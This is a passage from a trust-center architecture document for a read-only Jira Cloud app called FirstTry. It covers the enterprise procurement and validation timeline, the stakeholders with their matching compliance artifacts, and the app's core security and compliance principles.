├── Security team reviews ENTERPRISE_SECURITY_QUESTIONNAIRE.md
├── Privacy team reviews data_handling.md, PRIVACY_POLICY.md
├── Compliance team reviews SOC2_CONTROL_MAPPING.md
└── Legal team reviews TERMS_OF_SERVICE.md, SUPPORT_SLA.md

Week 3: Technical Validation
├── DevOps team clones repository
├── Runs marketplace audit: verify_marketplace_readiness_v2.sh
├── Reviews evidence pack: 04_playwright/logs/*
└── Confirms no write scopes, no external egress

Week 4: Risk Assessment
├── InfoSec reviews threat_model.md (STRIDE analysis)
├── DPO reviews data_retention.md (90-day policy)
├── CISO reviews incident_response.md (breach notification)
└── Risk committee approves deployment

Week 5-6: Procurement & Contracting
├── Procurement negotiates pricing (via Atlassian Marketplace)
├── Legal reviews contract terms (ToS, Privacy Policy, Support SLA)
├── Finance approves budget
└── Contract signed

Week 7: Deployment
├── Jira admin installs FirstTry on Jira Cloud instance
├── Configures gadget on team dashboards
├── Security team monitors first 30 days
└── Success metrics: No security incidents, positive user feedback

Ongoing: Compliance Monitoring
├── Quarterly: Review trust center docs for updates
├── Annually: Re-run marketplace audit (ensure no regressions)
└── As-needed: Incident response if security issue reported
```

### Procurement Stakeholders

| Stakeholder | Primary Concern | Trust Center Artifact |
|-------------|----------------|----------------------|
| **Procurement** | Vendor risk, contract terms | TRUST_CENTER.md, SUPPORT_SLA.md |
| **Security** | Vulnerabilities, attack surface | threat_model.md, security_whitepaper.md |
| **Privacy** | GDPR/CCPA compliance | data_handling.md, PRIVACY_POLICY.md |
| **Compliance** | SOC2, ISO27001 mapping | SOC2_CONTROL_MAPPING.md |
| **Legal** | Liability, indemnification, IP | TERMS_OF_SERVICE.md, PRIVACY_POLICY.md |
| **InfoSec** | Incident response, breach notification | incident_response.md, responsible_disclosure.md |
| **DPO** | Data retention, data subject rights | data_retention.md, data_handling.md |
| **DevOps** | Technical validation, evidence | verify_marketplace_readiness_v2.sh, evidence pack |
| **Finance** | Pricing, service credits | SUPPORT_SLA.md (service credits for downtime) |
| **CISO** | Overall risk posture | TRUST_CENTER.md (executive summary) |

---

## Summary

The FirstTry trust center architecture is designed around **five core principles**:

1. **Read-Only by Design** — No write scopes, no external egress, Forge sandbox isolation
2. **Evidence-Based Verification** — All claims backed by automated checks (marketplace audit, trust validator, SOC2 generator)
3. **Fail-Closed Validation** — Scripts exit 1 if any check fails (no silent failures)
4. **Deterministic and Tamper-Evident** — Same inputs → same outputs, SHA256 hashes prevent tampering
5. **Inherited Compliance** — Forge platform provides SOC2/ISO27001/GDPR baseline, FirstTry adds app-specific controls

**For Atlassian Marketplace Reviewers:**
- Run `./tools/marketplace_audit/verify_marketplace_readiness_v2.sh` to verify all claims
- Review evidence pack: `04_playwright/logs/network_classified.json` (no external egress)
- Check manifest: `manifest.yml` (no write scopes)

**For Enterprise Buyers:**
- Start at [docs/trust/TRUST_CENTER.md](../TRUST_CENTER.md) for navigation
- Complete vendor assessment with [docs/trust/ENTERPRISE_SECURITY_QUESTIONNAIRE.md](ENTERPRISE_SECURITY_QUESTIONNAIRE.md)
- Download SOC2 evidence pack: `build/soc2_evidence/soc2_evidence_pack.tar.gz`

**For Auditors:**
- Review SOC2 mapping: [docs/trust/soc2/SOC2_CONTROL_MAPPING.md](soc2/SOC2_CONTROL_MAPPING.md)
- Verify evidence for each control (39 Common Criteria + 4 Availability + 6 Confidentiality)
- Confirm Forge platform SOC2 Type II report (Atlassian-issued)

---

**Document Status:** ✅ **COMPLETE**  
**Last Validated:** 2024-12-19  
**Next Review:** Quarterly (or upon significant architecture change)
